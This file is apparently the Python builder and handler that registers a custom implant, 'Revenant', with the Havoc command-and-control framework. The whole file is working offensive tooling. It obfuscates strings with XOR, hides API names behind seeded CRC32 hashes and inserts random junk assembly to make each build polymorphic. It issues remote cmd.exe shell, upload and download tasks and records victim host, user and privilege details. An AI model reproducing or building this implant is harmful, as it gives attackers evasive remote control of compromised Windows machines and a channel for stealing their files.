import binascii
import subprocess
import glob
import os
import re
import random
import sys

from base64 import b64decode
from havoc.service import HavocService
from havoc.agent import *

COMMAND_REGISTER: int = 0x100
COMMAND_GET_JOB: int = 0x101
COMMAND_NO_JOB: int = 0x102
COMMAND_SHELL: int = 0x152
COMMAND_UPLOAD: int = 0x153
COMMAND_DOWNLOAD: int = 0x154
COMMAND_EXIT: int = 0x155
COMMAND_OUTPUT: int = 0x200


GENERATED_PASSWORD: str = ''.join(random.choices(string.ascii_letters, k=16))
password_bytes = GENERATED_PASSWORD.encode('utf-8')
password_hex = ", ".join(f"0x{b:02x}" for b in password_bytes)

seed_str: str = ''.join(random.choices(string.ascii_letters, k=8))
GENERATED_SEED = int(binascii.crc32(seed_str.encode())) # 0xDEADDEAD

directory_path = "./Agent/Source/"
# Volatile registers: rax, rcx, rdx, r8, r9
instructions = [
    "nop",
    "mov eax, ebx",
    "mov eax, ecx",
    "mov eax, edx",
    "mov eax, r8d",
    "mov eax, r9d",
    "inc rax",
    "dec rax",
    "xor rax, rax",
    "mov rax, rbx",
    "mov rax, rcx",
    "mov rax, rdx",
    "mov rax, r8",
    "mov rax, r9",
    "xor rax, rax",
    "cmp rax, rax",
    "test rax, rax",
    ''"pushfq;" \
    "push rcx;" \
    "push rdx;" \
    "push r8;" \
    "push r9;" \
    "xor eax, eax;" \
    "xor eax, eax;" \
    "xor ebx, ebx;" \
    "xor eax, eax;" \
    "xor eax, eax;" \
    "pop r9;" \
    "pop r8;" \
    "pop rdx;" \
    "pop rcx;" \
    "popfq;"''
]

plain_function_strings = [
    "#define RtlRandomEx_CRC32B                     \"RtlRandomEx\"",
    "#define RtlGetVersion_CRC32B                   \"RtlGetVersion\"",
    "#define RtlInitUnicodeString_CRC32B            \"RtlInitUnicodeString\"",
    "#define RtlAllocateHeap_CRC32B                 \"RtlAllocateHeap\"",
    "#define RtlGetProcessHeaps_CRC32B              \"RtlGetProcessHeaps\"",
    "#define RtlFreeHeap_CRC32B                     \"RtlFreeHeap\"",
    "#define RtlCreateProcessParametersEx_CBC32B    \"RtlCreateProcessParametersEx\"",
    "#define RtlDestroyProcessParameters_CRC32B     \"RtlDestroyProcessParameters\"",
    "#define NtCreateFile_CRC32b                    \"NtCreateFile\"",
    "#define NtOpenFile_CRC32b                      \"NtOpenFile\"",
    "#define NtProtectVirtualMemory_CRC32b          \"NtProtectVirtualMemory\"",
    "#define NtQueryInformationFile_CRC32B          \"NtQueryInformationFile\"",
    "#define NtAllocateVirtualMemory_CRC32B         \"NtAllocateVirtualMemory\"",
    "#define NtCreateUserProcess_CRC32B             \"NtCreateUserProcess\"",
    "#define NtWriteFile_CRC32B                     \"NtWriteFile\"",
    "#define NtReadFile_CRC32B                      \"NtReadFile\"",
    "#define WinHttpOpen_CRC32B                     \"WinHttpOpen\"",
    "#define WinHttpConnect_CRC32B                  \"WinHttpConnect\"",
    "#define WinHttpOpenRequest_CRC32B              \"WinHttpOpenRequest\"",
    "#define WinHttpReadData_CRC32B                 \"WinHttpReadData\"",
    "#define WinHttpReceiveResponse_CRC32B          \"WinHttpReceiveResponse\"",
    "#define WinHttpSendRequest_CRCB                \"WinHttpSendRequest\""

]

plain_strings = [
    "#define S_INSTANCE_NOT_CONNECTED \"instance not connected!\"",
    "#define S_COMMAND_NOT_FOUND      \"command not found\"",
    "#define S_IS_COMMAND_NO_JOB      \"is command no job\"",
    "#define S_TRANSPORT_FAILED       \"transport failed\"",
    "#define S_COMMAND_SHELL          \"command shell\"",
    "#define S_COMMAND_UPLOAD         \"command upload\"",
    "#define S_COMMAND_DOWNLOAD       \"command download\"",
    "#define S_COMMAND_EXIT           \"command exit\"",
    "#define S_WINHTTP                \"winhttp\"",
    "#define S_MARKER_MASK            \"xxxxxxxxxxxxxxxxxxxxxxxx\""
]


def crc32b(s: str):
    crc = 0xFFFFFFFF
    i = 0
    while i != len(s):
        byte = s[i]
        crc = crc ^ byte
        for j in range(7, -1, -1):
            mask = -1 * (crc & 1)
            crc = (crc >> 1) ^ (GENERATED_SEED & mask)
        i += 1
    return ~crc & 0xFFFFFFFF


def xor_encode(s: str) -> str:
    password_bytes: bytes = GENERATED_PASSWORD.encode()
    password_cycle: bytes = (password_bytes * (len(s) // len(password_bytes) + 1))[:len(s)]
    xor_bytes: bytes = bytes(b1 ^ b2 for b1, b2 in zip(s.encode(), password_cycle))
    return ", ".join(f"0x{b:02x}" for b in xor_bytes)


def generate_crc32b_defs(plain_function_strings):
    crc32b_defs = []
    output_string = f"#define SEED {GENERATED_SEED}"
    crc32b_defs.append(output_string)
    for string in plain_function_strings:
        # Extract function name from string definition
        function_name = string.split()[2].strip('"')

        # Calculate CRC32B hash of function name
        crc32b_hash = hex(crc32b(function_name.encode()))

        # Format output string with hash and original definition
        output_string = f"#define {function_name}_CRC32B {crc32b_hash}"

        # Add output string to list
        crc32b_defs.append(output_string)

    # Join all output strings into a single string with newline separators
    return "\n".join(crc32b_defs)

def encode_strings(strings):
    encoded_strings = []
    output = f"#define S_XK {{{password_hex}}}"
    encoded_strings.append(output)
    for s in strings:
        # Extract the string contents
        contents = s.split('"')[1]
        # Apply XOR encoding
        encoded = xor_encode(contents)
        # Format the output string
        output = f"#define {s.split()[1]} {{{encoded}}}"
        encoded_strings.append(output)
    return "\n".join(encoded_strings)


def replace_in_file(filename, old_string, new_string):
    with open(filename, "r+") as f:
        file_contents = f.read()
        updated_file_contents = file_contents.replace(old_string, new_string)
        f.seek(0)
        f.truncate()
        f.write(updated_file_contents)


def process_strings_h():
    strings_file = generate_crc32b_defs(plain_function_strings)+"\n"+encode_strings(plain_strings)
    for filepath in glob.iglob('**/Strings.h', recursive=True):
        with open(filepath, 'w') as f:
            f.write(strings_file)

def process_config_h(config: dict):
    config_user_agent:         str = config['Options']['Listener']['UserAgent']
    config_host_bind:          str = config['Options']['Listener']['HostBind']
    config_host_port:          str = config['Options']['Listener']['Port']
    config_host_secure:        str = str(config['Options']['Listener']['Secure']).upper()
    config_sleep:              str = config['Config']['Sleep']
    config_poly:               str = str(config['Config']['Polymorphic'])
    config_obf_strings:        str = str(config['Config']['Obfuscation'])
    config_arch:               str = config['Options']['Arch']
    config_native:             str = config['Config']['Native']

    header_file = f'''
#define CONFIG_USER_AGENT L"{config_user_agent}"
#define CONFIG_HOST L"{config_host_bind}"
#define CONFIG_PORT {config_host_port}
#define CONFIG_SECURE {str(config_host_secure).upper()}
#define CONFIG_SLEEP {config_sleep} 
#define CONFIG_POLYMORPHIC {str(config_poly).upper()}  
#define CONFIG_OBFUSCATION {str(config_obf_strings).upper()}
#define CONFIG_ARCH {config_arch}  
#define CONFIG_NATIVE {config_native}
    '''

    for filepath in glob.iglob('**/Config.h', recursive=True):
        with open(filepath, 'w') as f:
            f.write(header_file)


class CommandShell(Command):
    def __init__(self):
        self.CommandId: int = COMMAND_SHELL
        self.Name: str = "shell"
        self.Description: str = "executes command using cmd.exe"
        self.Help: str = ""
        self.NeedAdmin: bool = False
        self.Mitr: list = []
        self.Params: list = [
            CommandParam(
                name="commands",
                is_file_path=False,
                is_optional=False
            )
        ]

    def job_generate(self, arguments: dict) -> bytes:
        task: Packer = Packer()
        task.add_int(self.CommandId)
        task.add_data("c:\\windows\\system32\\cmd.exe /c " + arguments['commands'])
        return task.buffer


class CommandUpload(Command):
    def __init__(self):
        self.CommandId: int = COMMAND_UPLOAD
        self.Name: str = "upload"
        self.Description: str = "uploads a file to the host"
        self.Help: str = ""
        self.NeedAdmin: bool = False
        self.Mitr: list = []
        self.Params: list = [
            CommandParam(
                name="local_file",
                is_file_path=True,
                is_optional=False
            ),
            CommandParam(
                name="remote_file",
                is_file_path=False,
                is_optional=False
            )
        ]

    def job_generate(self, arguments: dict) -> bytes:
        task: Packer = Packer()
        remote_file: str = arguments['remote_file']
        filedata = b64decode(arguments['local_file']).decode()
        task.add_int(self.CommandId)
        task.add_data(remote_file)
        task.add_data(filedata)
        return task.buffer


class CommandDownload(Command):
    def __init__(self):
        self.CommandId: int = COMMAND_DOWNLOAD
        self.Name: str = "download"
        self.Description: str = "downloads the requested file"
        self.Help: str = ""
        self.NeedAdmin: bool = False
        self.Mitr: list = []
        self.Params: list = [
            CommandParam(
                name="remote_file",
                is_file_path=False,
                is_optional=False
            ),
        ]

    def job_generate(self, arguments: dict) -> bytes:
        task: Packer = Packer()
        remote_file: str = arguments['remote_file']
        task.add_int(self.CommandId)
        task.add_data(remote_file)
        return task.buffer


class CommandExit(Command):
    def __init__(self):
        self.CommandId: int = COMMAND_EXIT
        self.Name: str = "exit"
        self.Description: str = "tells agent to exit"
        self.Help: str = ""
        self.NeedAdmin: bool = False
        self.Mitr: list = []
        self.Params: list = []

    def job_generate(self, arguments: dict) -> bytes:
        task: Packer = Packer()
        task.add_int(self.CommandId)
        return task.buffer


class Revenant(AgentType):
    def __init__(self):
        self.Name: str = "Revenant"
        self.Author: str = "0xTriboulet for Malicious Group"
        self.Version: str = "0.3"
        self.Description: str = "Revenant Agent Testing"
        self.MagicValue = 0x72766e74

        self.Arch: list = ["x64", "x86"]
        self.Formats: list = [
            {"Name": "Windows Exe", "Extension": "exe"},
            {"Name": "Windows DLL", "Extension": "dll"}   # Not supported yet
        ]
        self.BuildingConfig: dict = {
            "Sleep": "10",
            "Polymorphic": True,
            "Obfuscation": True,
            "Native"    : True
        }
        self.Commands: list = [
            CommandShell(),
            CommandUpload(),
            CommandDownload(),
            CommandExit()
        ]

    def generate(self, config: dict) -> None:
        print(f"[*] Building Revenant Agent {self.Version}")
        # print(f"config: {config}")

        self.builder_send_message(config['ClientID'], "Info", f"hello from service builder")
        self.builder_send_message(config['ClientID'], "Info", f"Options Config: {config['Options']}")
        self.builder_send_message(config['ClientID'], "Info", f"Agent Config: {config['Config']}")

        # parse options from self
        print(f"[*] Revenant Magic Value {self.MagicValue}")

        print("[*] Configuring Config.h header...")
        process_config_h(config)

        if self.BuildingConfig["Obfuscation"]:
            process_strings_h()
            print("[*] Configuring String.h header...")

        if self.BuildingConfig["Polymorphic"]:
            process_directory(directory_path, instructions, False)
            print("[*] Configuring source files...")

        # compile_command: str = "cd ./Agent && make"
        compile_command: str = "cmake . && cmake --build . -j 1"

        try:
            process = subprocess.run(compile_command,
                                     shell=True,
                                     check=True,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE,
                                     universal_newlines=True)

            if self.BuildingConfig["Polymorphic"]:
                process_directory(directory_path, instructions, True)
                print("[*] Cleaning up source files...")

            print(process.stdout)
        except subprocess.CalledProcessError as error:
            print(f"Error occurred: {error.stderr}")

            if self.BuildingConfig["Polymorphic"]:
                process_directory(directory_path, instructions, True)
                print("[*] Cleaning up source files...")

            return

        data = open("Agent/Bin/Revenant.exe", "rb").read()

        # Below line sends the build executable back to Havoc for file management - 0xtriboulet
        self.builder_send_payload(config['ClientID'], self.Name + "." + self.Formats[0]["Extension"], data)

    def response(self, response: dict) -> bytes:

        agent_header: dict = response["AgentHeader"]
        agent_response = b64decode(response["Response"])
        response_parser = Parser(agent_response, len(agent_response))
        command: int = response_parser.parse_int()

        if response["Agent"] is None:
            if command == COMMAND_REGISTER:
                print("[*] Is agent register request")

                registerinfo = {
                    "AgentID": response_parser.parse_int(),
                    "Hostname": response_parser.parse_str(),
                    "Username": response_parser.parse_str(),
                    "Domain": response_parser.parse_str(),
                    "InternalIP": response_parser.parse_str(),
                    "Process Path": response_parser.parse_str(),
                    "Process ID": str(response_parser.parse_int()),
                    "Process Parent ID": str(response_parser.parse_int()),
                    "Process Arch": response_parser.parse_int(),
                    "Process Elevated": response_parser.parse_int(),
                    "OS Build": "{0}.{1}.{2}.{3}.{4}".format(str(response_parser.parse_int()),
                                                             str(response_parser.parse_int()),
                                                             str(response_parser.parse_int()),
                                                             str(response_parser.parse_int()),
                                                             str(response_parser.parse_int())),
                    "OS Arch": response_parser.parse_int(),
                    "Sleep": response_parser.parse_int(),
                }

                registerinfo["Process Name"] = registerinfo["Process Path"].split("\\")[-1]
                registerinfo["OS Version"] = registerinfo["OS Build"]

                os_arch_map = {
                    0: "x86",
                    9: "x64/AMD64",
                    5: "ARM",
                    12: "ARM64",
                    6: "Itanium-based"
                }

                registerinfo["OS Arch"] = os_arch_map.get(
                    registerinfo["OS Arch"],
                    "Unknown (" + str(registerinfo["OS Arch"]) + ")")

                proc_arch_map = {
                    0: "Unknown",
                    1: "x86",
                    2: "x64",
                    3: "IA64"
                }

                registerinfo["Process Arch"] = proc_arch_map.get(
                    registerinfo["Process Arch"],
                    "Unknown (" + str(registerinfo["Process Arch"]) + ")")

                self.register(agent_header, registerinfo)
                return registerinfo['AgentID'].to_bytes(4, 'little')  # return the agent id to the agent
            else:
                print("[-] Is not agent register request")
        else:
            print(f"[*] Something else: {command}")
            agentid = response["Agent"]["NameID"]
            if command == COMMAND_GET_JOB:
                print("[*] Get list of jobs and return it.")
                tasks = self.get_task_queue(response["Agent"])

                if len(tasks) == 0:
                    tasks = COMMAND_NO_JOB.to_bytes(4, 'little')

                print(f"tasks: {tasks.hex()}")
                return tasks

            elif command == COMMAND_OUTPUT:
                output = response_parser.parse_str()
                print("[*] Output: \n" + output)
                self.console_message(agentid, "Good", "Received Output:", output)
            elif command == COMMAND_UPLOAD:
                filesize = response_parser.parse_int()
                filename = response_parser.parse_str()
                self.console_message(agentid, "Good", f"File was uploaded: {filename} ({filesize} bytes)", "")
            elif command == COMMAND_DOWNLOAD:
                filename = response_parser.parse_str()
                filecontent = response_parser.parse_str()
                self.console_message(agentid, "Good", f"File was downloaded: {filename} ({len(filecontent)} bytes)", "")
                self.download_file(agentid, filename, len(filecontent), filecontent)
            else:
                self.console_message(agentid, "Error", "command not found: %4x" % command, "")

        return b''


def insert_asm_statements(file_contents, instructions):
    function_pattern = re.compile(
        r"(?P<return_type>[\w\s\*]+)\s+(?P<func_name>\w+)\s*\((?P<params>[^\)]*)\)\s*\{",
        re.MULTILINE
    )

    def insert_asm(match):
        num_statements = random.randint(1, 100)
        asm_statements = "\n".join(
            "//remove me\nasm(\"{}\");".format(random.choice(instructions)) for _ in range(num_statements)
        )
        return match.group(0) + "\n" + asm_statements

    modified_contents = function_pattern.sub(insert_asm, file_contents)

    return modified_contents

def remove_asm_statements(file_contents):
    # Regex pattern to match and remove lines after "//remove me" comments
    remove_pattern = re.compile(r"//remove me\n.*;\n?", re.MULTILINE)
    modified_contents = remove_pattern.sub("", file_contents)
    return modified_contents


def process_c_file(file_path, instructions, remove=False):
    with open(file_path, 'r') as input_file:
        file_contents = input_file.read()

    if remove:
        modified_contents = remove_asm_statements(file_contents)
    else:
        modified_contents = insert_asm_statements(file_contents, instructions)

    with open(file_path, 'w') as output_file:
        output_file.write(modified_contents)


def process_directory(directory_path, instructions, remove=False):
    for filename in os.listdir(directory_path):
        if filename.endswith('.c'):
            file_path = os.path.join(directory_path, filename)
            process_c_file(file_path, instructions, remove)
def main():
    havoc_revenant: Revenant = Revenant()

    print("[*] Connect to Havoc service api")
    havoc_service = HavocService(
        endpoint="ws://127.0.0.1:40056/service-endpoint",
        password="service-password"
    )

    print("[*] Register Revenant to Havoc")
    havoc_service.register_agent(havoc_revenant)

    return


if __name__ == '__main__':
    main()